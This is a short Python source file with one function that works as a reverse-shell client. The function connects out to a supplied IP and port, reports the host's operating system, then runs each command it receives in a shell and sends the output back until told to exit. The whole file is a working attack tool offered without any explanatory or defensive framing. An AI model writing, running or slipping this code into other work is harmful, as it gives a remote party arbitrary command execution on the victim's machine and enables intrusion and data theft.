import socket
import subprocess
import os
import platform

def start_reverse_shell(server_ip, server_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_ip, server_port))

        system_info = f"[+] Connected from {platform.system()} {platform.release()}\n"
        sock.send(system_info.encode())

        while True:
            command = sock.recv(1024).decode().strip()
            if command.lower() in ["exit", "quit"]:
                break
            if command:
                try:
                    if os.name == "nt":  # Windows
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    else:  # Linux / Mac
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    output = e.output
                sock.send(output if output else b"[!] No output\n")

    except Exception as e:
        print(f"[!] Connection error: {e}")
    finally:
        sock.close()
